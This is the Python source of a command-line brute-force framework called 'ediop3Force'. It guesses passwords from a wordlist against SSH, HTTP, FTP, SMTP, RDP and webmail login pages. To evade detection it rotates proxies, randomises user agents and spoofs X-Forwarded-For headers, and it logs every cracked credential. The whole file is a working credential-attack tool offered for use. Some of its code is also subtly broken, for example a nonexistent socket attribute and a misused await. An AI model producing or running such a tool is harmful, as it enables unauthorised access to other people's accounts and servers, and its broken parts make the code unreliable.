import cmd
import requests
import threading
import time
import os
import random
import json
from queue import Queue
from fake_useragent import UserAgent
import asyncio
from tqdm import tqdm
import smtplib
import ftplib
from pyrdp import rdp
from bs4 import BeautifulSoup
import paramiko
import socks
import socket
import urllib3
from datetime import datetime

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ediop3Force(cmd.Cmd):
    prompt = "ediop3Force> "
    intro = """
    ███████╗██████╗ ██╗ ██████╗ ██████╗ ██████╗ ██████╗
    ██╔════╝██╔══██╗██║██╔═══██╗██╔══██╗██╔══██╗██╔══██╗
    █████╗  ██║  ██║██║██║   ██║██████╔╝██████╔╝██████╔╝
    ██╔══╝  ██║  ██║██║██║   ██║██╔═══╝ ██╔══██╗██╔══██╗
    ███████╗██████╔╝██║╚██████╔╝██║     ██║  ██║██║  ██║
    ╚══════╝╚═════╝ ╚═╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝

    ediop3Force Framework
    idk
    haker
    Type 'help' for commands.
    """

    def __init__(self):
        super().__init__()
        self.target = None
        self.port = None
        self.username = None
        self.wordlist = None
        self.module = None
        self.threads = 100
        self.timeout = 15
        self.rate_limit = 0.05
        self.results = []
        self.proxies = []
        self.user_agents = []
        self.lock = threading.Lock()
        self.proxy_rotation_interval = 3
        self.last_proxy_refresh = 0
        self._init_proxies()
        self._init_user_agents()
        self.verbose = False
        self.max_retries = 3
        self.success_count = 0
        self.attempt_count = 0

    def _init_proxies(self):
        proxy_file = "proxy.txt"
        try:
            if os.path.exists(proxy_file):
                with open(proxy_file, 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                print(f"[+] Loaded {len(self.proxies)} proxies from {proxy_file}")
                self.last_proxy_refresh = time.time()
            else:
                print("[!] proxy.txt not found. Using direct connections")
                self.proxies = []
        except Exception as e:
            print(f"[!] Error initializing proxies: {e}")
            self.proxies = []

    def _rotate_proxies(self):
        if time.time() - self.last_proxy_refresh > self.proxy_rotation_interval:
            if self.verbose:
                print("[*] Rotating proxies...")
            self._init_proxies()

    def _get_random_proxy(self):
        self._rotate_proxies()
        try:
            if not self.proxies:
                return None
            proxy = random.choice(self.proxies)
            if '@' in proxy:
                return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            return {'http': f'http://{proxy}', 'https': f'https://{proxy}'}
        except Exception as e:
            if self.verbose:
                print(f"[!] Error selecting proxy: {e}")
            return None

    def _init_user_agents(self):
        try:
            ua = UserAgent()
            self.user_agents = [ua.random for _ in range(500)]
        except Exception as e:
            print(f"[!] Error initializing user agents: {e}")
            self.user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            ]

    def do_set(self, arg):
        """Set target parameters: set <option> <value>"""
        try:
            args = arg.split()
            if len(args) != 2:
                print("[!] Usage: set <option> <value>")
                return

            option, value = args
            if option == "target":
                self.target = value
            elif option == "port":
                self.port = int(value)
            elif option == "username":
                self.username = value
            elif option == "threads":
                self.threads = max(1, min(int(value), 500))
            elif option == "rate":
                self.rate_limit = max(0.01, min(float(value), 10))
            elif option == "verbose":
                self.verbose = value.lower() in ("true", "1", "yes")
            elif option == "retries":
                self.max_retries = max(1, min(int(value), 10))
            else:
                print("[!] Invalid option.")
        except Exception as e:
            print(f"[!] Error: {e}")

    def do_use(self, arg):
        """Select a module: use <ssh/http/ftp/smtp/rdp/webmail>"""
        if arg in ["ssh", "http", "ftp", "smtp", "rdp", "webmail"]:
            self.module = arg
            print(f"[+] Module set: {arg}")
            if arg == "webmail":
                print("[*] Webmail mode supports: gmail, yahoo, outlook, office365")
        else:
            print("[!] Available modules: ssh, http, ftp, smtp, rdp, webmail")

    def do_load(self, arg):
        """Load a wordlist: load <path/to/wordlist>"""
        try:
            if not os.path.exists(arg):
                print("[!] Wordlist not found.")
                return
            with open(arg, 'r', errors='ignore') as f:
                self.wordlist = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(self.wordlist)} passwords.")
        except Exception as e:
            print(f"[!] Error loading wordlist: {e}")

    def do_run(self, arg):
        """Start the brute force attack"""
        if not all([self.target, self.module, self.wordlist]):
            print("[!] Missing target, module, or wordlist.")
            return

        print(f"[*] Starting {self.module} brute force on {self.target}...")
        print(f"[*] Threads: {self.threads}, Rate: {self.rate_limit} req/s")
        print(f"[*] Using proxy rotation every {self.proxy_rotation_interval} seconds")
        start_time = time.time()
        self.success_count = 0
        self.attempt_count = 0

        if self.module == "ssh":
            asyncio.run(self._run_ssh_brute())
        elif self.module == "http":
            self._run_http_brute()
        elif self.module == "ftp":
            self._run_ftp_brute()
        elif self.module == "smtp":
            asyncio.run(self._run_smtp_brute())
        elif self.module == "rdp":
            self._run_rdp_brute()
        elif self.module == "webmail":
            self._run_webmail_brute()

        elapsed = time.time() - start_time
        print(f"\n[*] Attack completed in {elapsed:.2f} seconds")
        print(f"[*] Total attempts: {self.attempt_count}")
        print(f"[*] Successful logins: {self.success_count}")

    def do_stats(self, arg):
        """Show attack statistics"""
        print(f"[*] Attempts: {self.attempt_count}")
        print(f"[*] Successes: {self.success_count}")
        if self.attempt_count > 0:
            print(f"[*] Success rate: {(self.success_count/self.attempt_count)*100:.2f}%")

    def do_results(self, arg):
        """Show successful logins"""
        if not self.results:
            print("[!] No results yet.")
            return
        print("[+] Successful logins:")
        for r in self.results:
            print(f"  {r}")

    def do_exit(self, arg):
        """Exit the framework"""
        print("[+] Exiting...")
        return True

    # ========== ENHANCED BRUTE FORCE MODULES ==========
    async def _run_ssh_brute(self):
        if not self.port:
            self.port = 22
        print(f"[*] Targeting SSH on {self.target}:{self.port}")

        def ssh_worker(password):
            self.attempt_count += 1
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            proxy = self._get_random_proxy()
            
            try:
                if proxy and 'http' in proxy:
                    proxy_parts = proxy['http'].replace('http://', '').split(':')
                    if len(proxy_parts) == 2:
                        socks.set_default_proxy(socks.HTTP, proxy_parts[0], int(proxy_parts[1]))
                        socket.socket = socks.socksocket

                ssh.connect(self.target, port=self.port, username=self.username, 
                          password=password, timeout=self.timeout, banner_timeout=30)
                
                stdin, stdout, stderr = ssh.exec_command('whoami')
                user = stdout.read().decode().strip()
                
                if user:
                    with self.lock:
                        result = f"{self.username}:{password} (SSH - {user})"
                        print(f"[+] CRACKED PASSWORD: {result}")
                        self._add_result(result)
                        self.success_count += 1
                ssh.close()
            except Exception as e:
                if self.verbose and "Authentication failed" not in str(e):
                    print(f"[!] SSH error: {e}")
            finally:
                socks.set_default_proxy(socks.PROXY_TYPE_NONE)
                socket.socket = socket._socketobject

        self._threaded_attack(ssh_worker)

    def _run_http_brute(self):
        if not self.port:
            self.port = 80
        print(f"[*] Targeting HTTP on {self.target}:{self.port}")

        def http_worker(password):
            self.attempt_count += 1
            for attempt in range(self.max_retries):
                try:
                    proxy = self._get_random_proxy()
                    headers = {
                        'User-Agent': self._get_random_user_agent(),
                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    }
                    
                    for scheme in ['http', 'https']:
                        try:
                            url = f"{scheme}://{self.target}:{self.port}"
                            r = requests.get(url, auth=(self.username, password), 
                                           headers=headers, proxies=proxy, 
                                           timeout=self.timeout, verify=False)
                            
                            if r.status_code != 401:
                                with self.lock:
                                    result = f"{self.username}:{password} (HTTP - {r.status_code})"
                                    print(f"[+] CRACKED PASSWORD: {result}")
                                    self._add_result(result)
                                    self.success_count += 1
                                    return
                        except requests.exceptions.SSLError:
                            continue
                        except Exception:
                            break
                except Exception as e:
                    if self.verbose:
                        print(f"[!] HTTP attempt {attempt+1} failed: {e}")
                    time.sleep(1)

        self._threaded_attack(http_worker)

    def _run_ftp_brute(self):
        if not self.port:
            self.port = 21
        print(f"[*] Targeting FTP on {self.target}:{self.port}")

        def ftp_worker(password):
            self.attempt_count += 1
            for attempt in range(self.max_retries):
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(self.target, self.port, timeout=self.timeout)
                    ftp.set_pasv(random.choice([True, False]))
                    
                    login_result = ftp.login(self.username, password)
                    if "230" in login_result:
                        try:
                            current_dir = ftp.pwd()
                            with self.lock:
                                result = f"{self.username}:{password} (FTP - {current_dir})"
                                print(f"[+] CRACKED PASSWORD: {result}")
                                self._add_result(result)
                                self.success_count += 1
                        except:
                            with self.lock:
                                result = f"{self.username}:{password} (FTP)"
                                print(f"[+] CRACKED PASSWORD: {result}")
                                self._add_result(result)
                                self.success_count += 1
                        ftp.quit()
                        break
                except Exception as e:
                    if self.verbose and "530" not in str(e):
                        print(f"[!] FTP attempt {attempt+1} failed: {e}")
                    time.sleep(1)

        self._threaded_attack(ftp_worker)

    async def _run_smtp_brute(self):
        if not self.port:
            self.port = 25
        print(f"[*] Targeting SMTP on {self.target}:{self.port}")

        async def smtp_worker(password):
            self.attempt_count += 1
            for attempt in range(self.max_retries):
                try:
                    server = smtplib.SMTP(self.target, self.port, timeout=self.timeout)
                    
                    if random.choice([True, False]):
                        server.starttls()
                    
                    mechanisms = ['LOGIN', 'PLAIN', 'CRAM-MD5']
                    random.shuffle(mechanisms)
                    
                    for mechanism in mechanisms:
                        try:
                            server.login(self.username, password)
                            with self.lock:
                                result = f"{self.username}:{password} (SMTP - {mechanism})"
                                print(f"[+] CRACKED PASSWORD: {result}")
                                self._add_result(result)
                                self.success_count += 1
                            server.quit()
                            return
                        except smtplib.SMTPAuthenticationError:
                            continue
                        except Exception as e:
                            if self.verbose:
                                print(f"[!] SMTP error: {e}")
                            break
                except Exception as e:
                    if self.verbose:
                        print(f"[!] SMTP attempt {attempt+1} failed: {e}")
                    await asyncio.sleep(1)

        await self._threaded_attack(smtp_worker)

    def _run_rdp_brute(self):
        if not self.port:
            self.port = 3389
        print(f"[*] Targeting RDP on {self.target}:{self.port}")

        def rdp_worker(password):
            self.attempt_count += 1
            for attempt in range(self.max_retries):
                try:
                    proxy = self._get_random_proxy()
                    if proxy and 'http' in proxy:
                        proxy_parts = proxy['http'].replace('http://', '').split(':')
                        if len(proxy_parts) == 2:
                            socks.set_default_proxy(socks.HTTP, proxy_parts[0], int(proxy_parts[1]))
                            socket.socket = socks.socksocket

                    client = rdp.RDPClient()
                    if client.login(self.target, self.username, password, self.port):
                        with self.lock:
                            result = f"{self.username}:{password} (RDP)"
                            print(f"[+] CRACKED PASSWORD: {result}")
                            self._add_result(result)
                            self.success_count += 1
                    break
                except Exception as e:
                    if self.verbose:
                        print(f"[!] RDP attempt {attempt+1} failed: {e}")
                    time.sleep(1)
                finally:
                    socks.set_default_proxy(socks.PROXY_TYPE_NONE)
                    socket.socket = socket._socketobject

        self._threaded_attack(rdp_worker)

    def _run_webmail_brute(self):
        print(f"[*] Targeting Webmail on {self.target}")

        def webmail_worker(password):
            self.attempt_count += 1
            for attempt in range(self.max_retries):
                try:
                    proxy = self._get_random_proxy()
                    headers = {
                        'User-Agent': self._get_random_user_agent(),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'DNT': '1',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1'
                    }

                    endpoints = [
                        '/owa/auth.owa', '/ews/exchange.asmx', '/mail/',
                        '/webmail/', '/roundcube/', '/zimbra/',
                        '/horde/', '/squirrelmail/'
                    ]

                    for endpoint in endpoints:
                        try:
                            login_url = f"{self.target}{endpoint}"
                            session = requests.Session()
                            if proxy:
                                session.proxies.update(proxy)
                            
                            response = session.get(login_url, headers=headers, timeout=self.timeout, verify=False)
                            soup = BeautifulSoup(response.text, 'html.parser')
                            hidden_inputs = soup.find_all('input', {'type': 'hidden'})
                            form_data = {i['name']: i.get('value', '') for i in hidden_inputs}
                            
                            form_data.update({
                                'username': self.username,
                                'password': password,
                                'email': self.username,
                                'user': self.username,
                                'login': 'Login'
                            })
                            
                            form = soup.find('form')
                            if form and 'action' in form.attrs:
                                action = form['action']
                                if not action.startswith('http'):
                                    action = f"{self.target}{action}"
                            else:
                                action = login_url
                            
                            login_response = session.post(action, data=form_data, headers=headers, 
                                                        timeout=self.timeout, verify=False)
                            
                            if (login_response.status_code == 302 or 
                                'logout' in login_response.text.lower() or 
                                'sign out' in login_response.text.lower() or
                                'inbox' in login_response.text.lower()):
                                with self.lock:
                                    result = f"{self.username}:{password} (Webmail - {endpoint})"
                                    print(f"[+] CRACKED PASSWORD: {result}")
                                    self._add_result(result)
                                    self.success_count += 1
                                return
                        except Exception as e:
                            if self.verbose:
                                print(f"[!] Webmail endpoint {endpoint} failed: {e}")
                            continue
                except Exception as e:
                    if self.verbose:
                        print(f"[!] Webmail attempt {attempt+1} failed: {e}")
                    time.sleep(1)

        self._threaded_attack(webmail_worker)

    def _add_result(self, result):
        with self.lock:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.results.append(f"[{timestamp}] {result}")

    def _threaded_attack(self, func):
        queue = Queue()
        for pw in self.wordlist:
            queue.put(pw)

        with tqdm(total=len(self.wordlist)) as pbar:
            def worker():
                while not queue.empty():
                    pw = queue.get()
                    try:
                        func(pw)
                    except Exception as e:
                        if self.verbose:
                            print(f"[!] Worker error: {e}")
                    time.sleep(self.rate_limit)
                    queue.task_done()
                    pbar.update(1)

            threads = []
            for _ in range(min(self.threads, len(self.wordlist))):
                t = threading.Thread(target=worker)
                t.daemon = True
                t.start()
                threads.append(t)

            for t in threads:
                t.join()

if __name__ == '__main__':
    ediop3Force().cmdloop()
